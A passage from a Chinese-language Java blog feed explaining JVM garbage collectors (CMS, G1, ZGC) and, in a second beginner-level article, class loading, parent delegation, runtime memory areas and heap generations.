收集器的老年代版本</strong>，它同样是一个单线程收集器。它主要有两大用途：一种用途是在 JDK1.5 以及以前的版本中与 Parallel Scavenge 收集器搭配使用，另一种用途是作为 CMS 收集器的后备方案。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/152633231/serial-garbage-collector.png" alt="Serial 收集器"></p><h3 id="Parallel-Old-收集器"><a href="#Parallel-Old-收集器" class="headerlink" title="Parallel Old 收集器"></a>Parallel Old 收集器</h3><p><strong>Parallel Scavenge 收集器的老年代版本</strong>。使用多线程和“标记-整理”算法。在注重吞吐量以及 CPU 资源的场合，都可以优先考虑 Parallel Scavenge 收集器和 Parallel Old 收集器。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/152633231/parallel-scavenge-garbage-collector.png" alt="Parallel Old收集器运行示意图"></p><h3 id="CMS-收集器"><a href="#CMS-收集器" class="headerlink" title="CMS 收集器"></a>CMS 收集器</h3><p><strong>CMS（Concurrent Mark Sweep）收集器是一种以获取最短回收停顿时间为目标的收集器。它非常符合在注重用户体验的应用上使用。</strong></p><p><strong>CMS（Concurrent Mark Sweep）收集器是 HotSpot 虚拟机第一款真正意义上的并发收集器，它第一次实现了让垃圾收集线程与用户线程（基本上）同时工作。</strong></p><p>从名字中的<strong>Mark Sweep</strong>这两个词可以看出，CMS 收集器是一种 <strong>“标记-清除”算法</strong>实现的，它的运作过程相比于前面几种垃圾收集器来说更加复杂一些。整个过程分为四个步骤：</p><ul><li><strong>初始标记：</strong> 暂停所有的其他线程，并记录下直接与 root 相连的对象，速度很快 ；</li><li><strong>并发标记：</strong> 同时开启 GC 和用户线程，用一个闭包结构去记录可达对象。但在这个阶段结束，这个闭包结构并不能保证包含当前所有的可达对象。因为用户线程可能会不断的更新引用域，所以 GC 线程无法保证可达性分析的实时性。所以这个算法里会跟踪记录这些发生引用更新的地方。</li><li><strong>重新标记：</strong> 重新标记阶段就是为了修正并发标记期间因为用户程序继续运行而导致标记产生变动的那一部分对象的标记记录，这个阶段的停顿时间一般会比初始标记阶段的时间稍长，远远比并发标记阶段时间短</li><li><strong>并发清除：</strong> 开启用户线程，同时 GC 线程开始对未标记的区域做清扫。</li></ul><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/152633231/cms-garbage-collector.png" alt="CMS 收集器"></p><p>从它的名字就可以看出它是一款优秀的垃圾收集器，主要优点：<strong>并发收集、低停顿</strong>。但是它有下面三个明显的缺点：</p><ul><li><strong>对 CPU 资源敏感；</strong></li><li><strong>无法处理浮动垃圾；</strong></li><li><strong>它使用的回收算法-“标记-清除”算法会导致收集结束时会有大量空间碎片产生。</strong></li></ul><h3 id="G1-收集器"><a href="#G1-收集器" class="headerlink" title="G1 收集器"></a>G1 收集器</h3><p><strong>G1 (Garbage-First) 是一款面向服务器的垃圾收集器,主要针对配备多颗处理器及大容量内存的机器. 以极高概率满足 GC 停顿时间要求的同时,还具备高吞吐量性能特征.</strong></p><p>被视为 JDK1.7 中 HotSpot 虚拟机的一个重要进化特征。它具备以下特点：</p><ul><li><strong>并行与并发</strong>：G1 能充分利用 CPU、多核环境下的硬件优势，使用多个 CPU（CPU 或者 CPU 核心）来缩短 Stop-The-World 停顿时间。部分其他收集器原本需要停顿 Java 线程执行的 GC 动作，G1 收集器仍然可以通过并发的方式让 java 程序继续执行。</li><li><strong>分代收集</strong>：虽然 G1 可以不需要其他收集器配合就能独立管理整个 GC 堆，但是还是保留了分代的概念。</li><li><strong>空间整合</strong>：与 CMS 的“标记-清除”算法不同，G1 从整体来看是基于“标记-整理”算法实现的收集器；从局部上来看是基于“标记-复制”算法实现的。</li><li><strong>可预测的停顿</strong>：这是 G1 相对于 CMS 的另一个大优势，降低停顿时间是 G1 和 CMS 共同的关注点，但 G1 除了追求低停顿外，还能建立可预测的停顿时间模型，能让使用者明确指定在一个长度为 M 毫秒的时间片段内，消耗在垃圾收集上的时间不得超过 N 毫秒。</li></ul><p>G1 收集器的运作大致分为以下几个步骤：</p><ul><li><strong>初始标记</strong></li><li><strong>并发标记</strong></li><li><strong>最终标记</strong></li><li><strong>筛选回收</strong></li></ul><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/152633231/g1-garbage-collector.png" alt="G1 收集器"></p><p><strong>G1 收集器在后台维护了一个优先列表，每次根据允许的收集时间，优先选择回收价值最大的 Region(这也就是它的名字 Garbage-First 的由来)</strong> 。这种使用 Region 划分内存空间以及有优先级的区域回收方式，保证了 G1 收集器在有限时间内可以尽可能高的收集效率（把内存化整为零）。</p><p><strong>从 JDK9 开始，G1 垃圾收集器成为了默认的垃圾收集器。</strong></p><h3 id="ZGC-收集器"><a href="#ZGC-收集器" class="headerlink" title="ZGC 收集器"></a>ZGC 收集器</h3><p>与 CMS 中的 ParNew 和 G1 类似，ZGC 也采用标记-复制算法，不过 ZGC 对该算法做了重大改进。</p><p>在 ZGC 中出现 Stop The World 的情况会更少！</p><p>Java11 的时候 ，ZGC 还在试验阶段。经过多个版本的迭代，不断的完善和修复问题，ZGC 在 Java 15 已经可以正式使用了！</p><p>不过，默认的垃圾回收器依然是 G1。你可以通过下面的参数启动 ZGC：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ java -XX:+UseZGC className</span><br></pre></td></tr></tbody></table></figure><p>关于 ZGC 收集器的详细介绍推荐阅读美团技术团队的 <a href="https://tech.meituan.com/2020/08/06/new-zgc-practice-in-meituan.html">新一代垃圾回收器 ZGC 的探索与实践</a> 这篇文章。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>javaguide: <a href="https://javaguide.cn/java/jvm/">https://javaguide.cn/java/jvm/</a></li><li>《深入理解 Java 虚拟机：JVM 高级特性与最佳实践（第二版》</li><li><a href="https://my.oschina.net/hosee/blog/644618">https://my.oschina.net/hosee/blog/644618</a></li><li><a href="https://docs.oracle.com/javase/specs/jvms/se8/html/index.html">https://docs.oracle.com/javase/specs/jvms/se8/html/index.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大白话带你认识 JVM</title>
      <link href="/posts/314390907/"/>
      <url>/posts/314390907/</url>
      
        <content type="html"><![CDATA[<blockquote><p>来自<a href="https://juejin.im/user/5c2400afe51d45451758aa96">说出你的愿望吧丷</a>投稿，原文地址：<a href="https://juejin.im/post/5e1505d0f265da5d5d744050">https://juejin.im/post/5e1505d0f265da5d5d744050</a> 。</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>如果在文中用词或者理解方面出现问题，欢迎指出。此文旨在提及而不深究，但会尽量效率地把知识点都抛出来</p><h2 id="一、JVM-的基本介绍"><a href="#一、JVM-的基本介绍" class="headerlink" title="一、JVM 的基本介绍"></a>一、JVM 的基本介绍</h2><p>JVM 是 Java Virtual Machine 的缩写，它是一个虚构出来的计算机，一种规范。通过在实际的计算机上仿真模拟各类计算机功能实现···</p><p>好，其实抛开这么专业的句子不说，就知道 JVM 其实就类似于一台小电脑运行在 windows 或者 linux 这些操作系统环境下即可。它直接和操作系统进行交互，与硬件不直接交互，而操作系统可以帮我们完成和硬件进行交互的工作。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/314390907/d947f91e44c44c6c80222b49c2dee859-new-image19a36451-d673-486e-9c8e-3c7d8ab66929.png"></p><h3 id="1-1-Java-文件是如何被运行的"><a href="#1-1-Java-文件是如何被运行的" class="headerlink" title="1.1 Java 文件是如何被运行的"></a>1.1 Java 文件是如何被运行的</h3><p>比如我们现在写了一个 HelloWorld.java 好了，那这个 HelloWorld.java 抛开所有东西不谈，那是不是就类似于一个文本文件，只是这个文本文件它写的都是英文，而且有一定的缩进而已。</p><p>那我们的 <strong>JVM</strong> 是不认识文本文件的，所以它需要一个 <strong>编译</strong> ，让其成为一个它会读二进制文件的 <strong>HelloWorld.class</strong></p><h4 id="①-类加载器"><a href="#①-类加载器" class="headerlink" title="① 类加载器"></a>① 类加载器</h4><p>如果 <strong>JVM</strong> 想要执行这个 <strong>.class</strong> 文件，我们需要将其装进一个 <strong>类加载器</strong> 中，它就像一个搬运工一样，会把所有的 <strong>.class</strong> 文件全部搬进 JVM 里面来。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/314390907/81f1813f371c40ffa1c1f6d78bc49ed9-new-image28314ec8-066f-451e-8373-4517917d6bf7.png"></p><h4 id="②-方法区"><a href="#②-方法区" class="headerlink" title="② 方法区"></a>② 方法区</h4><p><strong>方法区</strong> 是用于存放类似于元数据信息方面的数据的，比如类信息，常量，静态变量，编译后代码···等</p><p>类加载器将 .class 文件搬过来就是先丢到这一块上</p><h4 id="③-堆"><a href="#③-堆" class="headerlink" title="③ 堆"></a>③ 堆</h4><p><strong>堆</strong> 主要放了一些存储的数据，比如对象实例，数组···等，它和方法区都同属于 <strong>线程共享区域</strong> 。也就是说它们都是 <strong>线程不安全</strong> 的</p><h4 id="④-栈"><a href="#④-栈" class="headerlink" title="④ 栈"></a>④ 栈</h4><p><strong>栈</strong> 这是我们的代码运行空间。我们编写的每一个方法都会放到 <strong>栈</strong> 里面运行。</p><p>我们会听说过 本地方法栈 或者 本地方法接口 这两个名词，不过我们基本不会涉及这两块的内容，它俩底层是使用 C 来进行工作的，和 Java 没有太大的关系。</p><h4 id="⑤-程序计数器"><a href="#⑤-程序计数器" class="headerlink" title="⑤ 程序计数器"></a>⑤ 程序计数器</h4><p>主要就是完成一个加载工作，类似于一个指针一样的，指向下一行我们需要执行的代码。和栈一样，都是 <strong>线程独享</strong> 的，就是说每一个线程都会有自己对应的一块区域而不会存在并发和多线程的问题。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/314390907/897863ee5ecb4d92b9119d065f468262-new-imagef7287f0b-c9f0-4f22-9eb4-6968bbaa5a82.png"></p><h4 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h4><ol><li>Java 文件经过编译后变成 .class 字节码文件</li><li>字节码文件通过类加载器被搬运到 JVM 虚拟机中</li><li>虚拟机主要的 5 大块：方法区，堆都为线程共享区域，有线程安全问题，栈和本地方法栈和计数器都是独享区域，不存在线程安全问题，而 JVM 的调优主要就是围绕堆，栈两大块进行</li></ol><h3 id="1-2-简单的代码例子"><a href="#1-2-简单的代码例子" class="headerlink" title="1.2 简单的代码例子"></a>1.2 简单的代码例子</h3><p>一个简单的学生类</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/314390907/29046a721c2548e0a0680ec5baf4ea95-new-imageb0b42e5e-8e25-409e-b7b9-6586a39a0b8d.png"></p><p>一个 main 方法</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/314390907/a3d34d33eab74f6f8743ecf62807445c-new-image08506a9e-5101-4f30-b0bc-3abbcb8f1894.png"></p><p>执行 main 方法的步骤如下:</p><ol><li> 编译好 App.java 后得到 App.class 后，执行 App.class，系统会启动一个 JVM 进程，从 classpath 路径中找到一个名为 App.class 的二进制文件，将 App 的类信息加载到运行时数据区的方法区内，这个过程叫做 App 类的加载</li><li> JVM 找到 App 的主程序入口，执行 main 方法</li><li> 这个 main 中的第一条语句为 Student student = new Student(“tellUrDream”) ，就是让 JVM 创建一个 Student 对象，但是这个时候方法区中是没有 Student 类的信息的，所以 JVM 马上加载 Student 类，把 Student 类的信息放到方法区中</li><li> 加载完 Student 类后，JVM 在堆中为一个新的 Student 实例分配内存，然后调用构造函数初始化 Student 实例，这个 Student 实例持有 <strong>指向方法区中的 Student 类的类型信息</strong> 的引用</li><li> 执行 student.sayName();时，JVM 根据 student 的引用找到 student 对象，然后根据 student 对象持有的引用定位到方法区中 student 类的类型信息的方法表，获得 sayName() 的字节码地址。</li><li> 执行 sayName()</li></ol><p>其实也不用管太多，只需要知道对象实例初始化时会去方法区中找类信息，完成后再到栈那里去运行方法。找方法就在方法表中找。</p><h2 id="二、类加载器的介绍"><a href="#二、类加载器的介绍" class="headerlink" title="二、类加载器的介绍"></a>二、类加载器的介绍</h2><p>之前也提到了它是负责加载.class 文件的，它们在文件开头会有特定的文件标示，将 class 文件字节码内容加载到内存中，并将这些内容转换成方法区中的运行时数据结构，并且 ClassLoader 只负责 class 文件的加载，而是否能够运行则由 Execution Engine 来决定</p><h3 id="2-1-类加载器的流程"><a href="#2-1-类加载器的流程" class="headerlink" title="2.1 类加载器的流程"></a>2.1 类加载器的流程</h3><p>从类被加载到虚拟机内存中开始，到释放内存总共有 7 个步骤：加载，验证，准备，解析，初始化，使用，卸载。其中<strong>验证，准备，解析三个部分统称为连接</strong></p><h4 id="2-1-1-加载"><a href="#2-1-1-加载" class="headerlink" title="2.1.1 加载"></a>2.1.1 加载</h4><ol><li> 将 class 文件加载到内存</li><li> 将静态数据结构转化成方法区中运行时的数据结构</li><li> 在堆中生成一个代表这个类的 java.lang.Class 对象作为数据访问的入口</li></ol><h4 id="2-1-2-链接"><a href="#2-1-2-链接" class="headerlink" title="2.1.2 链接"></a>2.1.2 链接</h4><ol><li> 验证：确保加载的类符合 JVM 规范和安全，保证被校验类的方法在运行时不会做出危害虚拟机的事件，其实就是一个安全检查</li><li> 准备：为 static 变量在方法区中分配内存空间，设置变量的初始值，例如 static int a = 3 （注意：准备阶段只设置类中的静态变量（方法区中），不包括实例变量（堆内存中），实例变量是对象初始化时赋值的）</li><li> 解析：虚拟机将常量池内的符号引用替换为直接引用的过程（符号引用比如我现在 import java.util.ArrayList 这就算符号引用，直接引用就是指针或者对象地址，注意引用对象一定是在内存进行）</li></ol><h4 id="2-1-3-初始化"><a href="#2-1-3-初始化" class="headerlink" title="2.1.3 初始化"></a>2.1.3 初始化</h4><p>初始化其实就是执行类构造器方法的<code>&lt;clinit&gt;()</code>的过程，而且要保证执行前父类的<code>&lt;clinit&gt;()</code>方法执行完毕。这个方法由编译器收集，顺序执行所有类变量（static 修饰的成员变量）显式初始化和静态代码块中语句。此时准备阶段时的那个 <code>static int a</code> 由默认初始化的 0 变成了显式初始化的 3。 由于执行顺序缘故，初始化阶段类变量如果在静态代码块中又进行了更改，会覆盖类变量的显式初始化，最终值会为静态代码块中的赋值。</p><blockquote><p>注意：字节码文件中初始化方法有两种，非静态资源初始化的<code>&lt;init&gt;</code>和静态资源初始化的<code>&lt;clinit&gt;</code>，类构造器方法<code>&lt;clinit&gt;()</code>不同于类的构造器，这些方法都是字节码文件中只能给 JVM 识别的特殊方法。</p></blockquote><h4 id="2-1-4-卸载"><a href="#2-1-4-卸载" class="headerlink" title="2.1.4 卸载"></a>2.1.4 卸载</h4><p>GC 将无用对象从内存中卸载</p><h3 id="2-2-类加载器的加载顺序"><a href="#2-2-类加载器的加载顺序" class="headerlink" title="2.2 类加载器的加载顺序"></a>2.2 类加载器的加载顺序</h3><p>加载一个 Class 类的顺序也是有优先级的，类加载器从最底层开始往上的顺序是这样的</p><ol><li> BootStrap ClassLoader：rt.jar</li><li> Extension ClassLoader: 加载扩展的 jar 包</li><li> App ClassLoader：指定的 classpath 下面的 jar 包</li><li> Custom ClassLoader：自定义的类加载器</li></ol><h3 id="2-3-双亲委派机制"><a href="#2-3-双亲委派机制" class="headerlink" title="2.3 双亲委派机制"></a>2.3 双亲委派机制</h3><p>当一个类收到了加载请求时，它是不会先自己去尝试加载的，而是委派给父类去完成，比如我现在要 new 一个 Person，这个 Person 是我们自定义的类，如果我们要加载它，就会先委派 App ClassLoader ，只有当父类加载器都反馈自己无法完成这个请求（也就是父类加载器都没有找到加载所需的 Class）时，子类加载器才会自行尝试加载。</p><p>这样做的好处是，加载位于 rt.jar 包中的类时不管是哪个加载器加载，最终都会委托到 BootStrap ClassLoader 进行加载，这样保证了使用不同的类加载器得到的都是同一个结果。</p><p>其实这个也是一个隔离的作用，避免了我们的代码影响了 JDK 的代码，比如我现在自己定义一个 <code>java.lang.String</code>：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> java.lang;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">String</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">        System.out.println();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>尝试运行当前类的 <code>main</code> 函数的时候，我们的代码肯定会报错。这是因为在加载的时候其实是找到了 rt.jar 中的<code>java.lang.String</code>，然而发现这个里面并没有 <code>main</code> 方法。</p><h2 id="三、运行时数据区"><a href="#三、运行时数据区" class="headerlink" title="三、运行时数据区"></a>三、运行时数据区</h2><h3 id="3-1-本地方法栈和程序计数器"><a href="#3-1-本地方法栈和程序计数器" class="headerlink" title="3.1 本地方法栈和程序计数器"></a>3.1 本地方法栈和程序计数器</h3><p>比如说我们现在点开 Thread 类的源码，会看到它的 start0 方法带有一个 native 关键字修饰，而且不存在方法体，这种用 native 修饰的方法就是本地方法，这是使用 C 来实现的，然后一般这些方法都会放到一个叫做本地方法栈的区域。</p><p>程序计数器其实就是一个指针，它指向了我们程序中下一句需要执行的指令，它也是内存区域中唯一一个不会出现 OutOfMemoryError 的区域，而且占用内存空间小到基本可以忽略不计。这个内存仅代表当前线程所执行的字节码的行号指示器，字节码解析器通过改变这个计数器的值选取下一条需要执行的字节码指令。</p><p>如果执行的是 native 方法，那这个指针就不工作了。</p><h3 id="3-2-方法区"><a href="#3-2-方法区" class="headerlink" title="3.2 方法区"></a>3.2 方法区</h3><p>方法区主要的作用是存放类的元数据信息，常量和静态变量···等。当它存储的信息过大时，会在无法满足内存分配时报错。</p><h3 id="3-3-虚拟机栈和虚拟机堆"><a href="#3-3-虚拟机栈和虚拟机堆" class="headerlink" title="3.3 虚拟机栈和虚拟机堆"></a>3.3 虚拟机栈和虚拟机堆</h3><p>一句话便是：栈管运行，堆管存储。则虚拟机栈负责运行代码，而虚拟机堆负责存储数据。</p><h4 id="3-3-1-虚拟机栈的概念"><a href="#3-3-1-虚拟机栈的概念" class="headerlink" title="3.3.1 虚拟机栈的概念"></a>3.3.1 虚拟机栈的概念</h4><p>它是 Java 方法执行的内存模型。里面会对局部变量，动态链表，方法出口，栈的操作（入栈和出栈）进行存储，且线程独享。同时如果我们听到局部变量表，那也是在说虚拟机栈</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span>{</span><br><span class="line">    <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doSomething</span><span class="params">()</span>{</span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="3-3-2-虚拟机栈存在的异常"><a href="#3-3-2-虚拟机栈存在的异常" class="headerlink" title="3.3.2 虚拟机栈存在的异常"></a>3.3.2 虚拟机栈存在的异常</h4><p>如果线程请求的栈的深度大于虚拟机栈的最大深度，就会报 <strong>StackOverflowError</strong> （这种错误经常出现在递归中）。Java 虚拟机也可以动态扩展，但随着扩展会不断地申请内存，当无法申请足够内存时就会报错 <strong>OutOfMemoryError</strong>。</p><h4 id="3-3-3-虚拟机栈的生命周期"><a href="#3-3-3-虚拟机栈的生命周期" class="headerlink" title="3.3.3 虚拟机栈的生命周期"></a>3.3.3 虚拟机栈的生命周期</h4><p>对于栈来说，不存在垃圾回收。只要程序运行结束，栈的空间自然就会释放了。栈的生命周期和所处的线程是一致的。</p><p>这里补充一句：8 种基本类型的变量+对象的引用变量+实例方法都是在栈里面分配内存。</p><h4 id="3-3-4-虚拟机栈的执行"><a href="#3-3-4-虚拟机栈的执行" class="headerlink" title="3.3.4 虚拟机栈的执行"></a>3.3.4 虚拟机栈的执行</h4><p>我们经常说的栈帧数据，说白了在 JVM 中叫栈帧，放到 Java 中其实就是方法，它也是存放在栈中的。</p><p>栈中的数据都是以栈帧的格式存在，它是一个关于方法和运行期数据的数据集。比如我们执行一个方法 a，就会对应产生一个栈帧 A1，然后 A1 会被压入栈中。同理方法 b 会有一个 B1，方法 c 会有一个 C1，等到这个线程执行完毕后，栈会先弹出 C1，后 B1,A1。它是一个先进后出，后进先出原则。</p><h4 id="3-3-5-局部变量的复用"><a href="#3-3-5-局部变量的复用" class="headerlink" title="3.3.5 局部变量的复用"></a>3.3.5 局部变量的复用</h4><p>局部变量表用于存放方法参数和方法内部所定义的局部变量。它的容量是以 Slot 为最小单位，一个 slot 可以存放 32 位以内的数据类型。</p><p>虚拟机通过索引定位的方式使用局部变量表，范围为[0,局部变量表的 slot 的数量]。方法中的参数就会按一定顺序排列在这个局部变量表中，至于怎么排的我们可以先不关心。而为了节省栈帧空间，这些 slot 是可以复用的，当方法执行位置超过了某个变量，那么这个变量的 slot 可以被其它变量复用。当然如果需要复用，那我们的垃圾回收自然就不会去动这些内存。</p><h4 id="3-3-6-虚拟机堆的概念"><a href="#3-3-6-虚拟机堆的概念" class="headerlink" title="3.3.6 虚拟机堆的概念"></a>3.3.6 虚拟机堆的概念</h4><p>JVM 内存会划分为堆内存和非堆内存，堆内存中也会划分为<strong>年轻代</strong>和<strong>老年代</strong>，而非堆内存则为<strong>永久代</strong>。年轻代又会分为<strong>Eden</strong>和<strong>Survivor</strong>区。Survivor 也会分为<strong>FromPlace</strong>和<strong>ToPlace</strong>，toPlace 的 survivor 区域是空的。Eden，FromPlace 和 ToPlace 的默认占比为 <strong>8:1:1</strong>。当然这个东西其实也可以通过一个 -XX:+UsePSAdaptiveSurvivorSizePolicy 参数来根据生成对象的速率动态调整</p><p>堆内存中存放的是对象，垃圾收集就是收集这些对象然后交给 GC 算法进行回收。非堆内存其实我们已经说过了，就是方法区。在 1.8 中已经移除永久代，替代品是一个元空间(MetaSpace)，最大区别是 metaSpace 是不存在于 JVM 中的，它使用的是本地内存。并有两个参数</p><pre><code>MetaspaceSize：初始化元空间大小，控制发生GCMaxMetaspaceSize：限制元空间大小上限，防止占用过多物理内存。</code></pre><p>移除的原因可以大致了解一下：融合 HotSpot JVM 和 JRockit VM 而做出的改变，因为 JRockit 是没有永久代的，不过这也间接性地解决了永久代的 OOM 问题。</p><h4 id="3-3-7-Eden-年轻代的介绍"><a href="#3-3-7-Eden-年轻代的介绍" class="headerlink" title="3.3.7 Eden 年轻代的介绍"></a>3.3.7 Eden 年轻代的介绍</h4><p>当我们 new 一个对象后，会先放到 Eden 划分出来的一块作为存储空间的内存，但是我们知道对堆内存是线程共享的，所以有可能会出现两个对象共用一个内存的情况。这里 JVM 的处理是为每个线程都预先申请好一块连续的内存空间并规定了对象存放的位置，而如果空间不足会再申请多块内存空间。这个操作我们会称作 TLAB，有兴趣可以了解一下。</p><p>当 Eden 空间满了之后，会触发一个叫做 Minor GC（就是一个发生在年轻代的 GC）的操作，存活下来的对象移动到 Survivor0 区。<del>Survivor0 区满后触发 Minor GC，就会将存活对象移动到 Survivor1 区</del>，此时还会把 from 和 to 两个指针交换，这样保证了一段时间内总有一个 survivor 区为空且 to 所指向的 survivor 区为空。经过多次的 Minor GC 后仍然存活的对象（<strong>这里的存活判断是 15 次，对应到虚拟机参数为 -XX:MaxTenuringThreshold 。为什么是 15，因为 HotSpot 会在对象头中的标记字段里记录年龄，分配到的空间仅有 4 位，所以最多只能记录到 15</strong>）会移动到老年代。</p><blockquote><p>🐛 修正：当 Eden 区内存空间满了的时候，就会触发 Minor GC，Survivor0 区满不会触发 Minor GC 。</p><p><strong>那 Survivor0 区 的对象什么时候垃圾回收呢？</strong></p><p>假设 Survivor0 区现在是满的，此时又触发了 Minor GC ，发现 Survivor0 区依旧是满的，存不下，此时会将 S0 区与 Eden 区的对象一起进行可达性分析，找出活跃的对象，将它复制到 S1 区并且将 S0 区域和 Eden 区的对象给清空，这样那些不可达的对象进行清除，并且将 S0 区 和 S1 区交换。</p></blockquote><p>老年代是存储长期存活的对象的，占满时就会触发我们最常听说的 Full GC，期间会停止所有线程等待 GC 的完成。所以对于响应要求高的应用应该尽量去减少发生 Full GC 从而避免响应超时的问题。</p><p>而且当老年区执行了 full gc 之后仍然无法进行对象保存的操作，就会产生 OOM，这时候就是虚拟机中的堆内存不足，原因可能会是堆内存设置的大小过小，这个可以通过参数-Xms、-Xmx 来调整。也可能是代码中创建的对象大且多，而且它们一直在被引用从而长时间垃圾收集无法收集它们。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/314390907/c02ecba3c33f43429a765987b928e423-new-image93b46f3d-33f9-46f9-a825-ec7129b004f6.png"></p><p>补充说明：关于-XX:TargetSurvivorRatio 参数的问题。其实也不一定是要满足-XX:MaxTenuringThreshold 才移动到老年代。可以举个例子：如对象年龄 5 的占 30%，年龄 6 的占 36%，年龄 7 的占 34%，加入某个年龄段（如例子中的年龄 6）后，总占用超过 Survivor 空间*TargetSurvivorRatio 的时候，从该年龄段开始及大于的年龄对象就要进入老年代（即例子中的年龄 6 对象，就是年龄 6 和年龄 7 晋升到老年代），这时候无需等到 MaxTenuringThreshold 中要求的 15</p><h4 id="3-3-8-如何判断一个对象需要被干掉"><a href="#3-3-8-如何判断一个对象需要被干掉" class="headerlink" title="3.3.8 如何判断一个对象需要被干掉"></a>3.3.8 如何判断一个对象需要被干掉</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/314390907/1c1d85b5fb8b47239af2a5c0436eb2d7-new-image0cd10827-2f96-433c-9b16-93d4fe491d88.png"></p><p>图中程序计数器、虚拟机栈、本地方法栈，3 个区域随着线程的生存而生存的。内存分配和回收都是确定的。随着线程的结束内存自然就被回收了，因此不需要考虑垃圾回收的问题。而 Java 堆和方法区则不一样，各线程共享，内存的分配和回收都是动态的。因此垃圾收集器所关注的都是堆和方法这部分内存。</p><p>在进行回收前就要判断哪些对象还存活，哪些已经死去。下面介绍两个基础的计算方法</p><p>1.引用计数器计算：给对象添加一个引用计数器，每次引用这个对象时计数器加一，引用失效时减一，计数器等于 0 时就是不会再次使用的。不过这个方法有一种情况就是出现对象的循环引用时 GC 没法回收。</p><p>2.可达性分析计算：这是一种类似于二叉树的实现，将一系列的 GC ROOTS 作为起始的存活对象集，从这个节点往下搜索，搜索所走过的路径成为引用链，把能被该集合引用到的对象加入到集合中。搜索当一个对象到 GC Roots 没有使用任何引用链时，则说明该对象是不可用的。主流的商用程序语言，例如 Java，C#等都是靠这招去判定对象是否存活的。</p><p>（了解一下即可）在 Java 语言汇总能作为 GC Roots 的对象分为以下几种：</p><ol><li> 虚拟机栈（栈帧中的本地方法表）中引用的对象（局部变量）</li><li> 方法区中静态变量所引用的对象（静态变量）</li><li> 方法区中常量引用的对象</li><li> 本地方法栈（即 native 修饰的方法）中 JNI 引用的对象（JNI 是 Java 虚拟机调用对应的 C 函数的方式，通过 JNI 函数也可以创建新的 Java 对象。且 JNI 对于对象的局部引用或者全局引用都会把它们指向的对象都标记为不可回收）</li><li> 已启动的且未终止的 Java 线程</li></ol><p>这种方法的优点是能够解决循环引用的问题，可它的实现需要耗费大量资源和时间，也需要 GC（它的分析过程引用关系不能发生变化，所以需要停止所有进程）</p><h4 id="3-3-9-如何宣告一个对象的真正死亡"><a href="#3-3-9-如何宣告一个对象的真正死亡" class="headerlink" title="3.3.9 如何宣告一个对象的真正死亡"></a>3.3.9 如何宣告一个对象的真正死亡</h4><p>首先必须要提到的是一个名叫 <strong>finalize()</strong> 的方法</p><p>finalize()是 Object 类的一个方法、一个对象的 finalize()方法只会被系统自动调用一次，经过 finalize()方法逃脱死亡的对象，第二次不会再调用。</p><p>补充一句：并不提倡在程序中调用 finalize()来进行自救。建议忘掉 Java 程序中该方法的存在。因为它执行的时间不确定，甚至是否被执行也不确定（Java 程序的不正常退出），而且运行代价高昂，无法保证各个对象的调用顺序（甚至有不同线程中调用）。在 Java9 中已经被标记为 <strong>deprecated</strong> ，且 <code>java.lang.ref.Cleaner</code>（也就是强、软、弱、幻象引用的那一套）中已经逐步替换掉它，会比 <code>finalize</code> 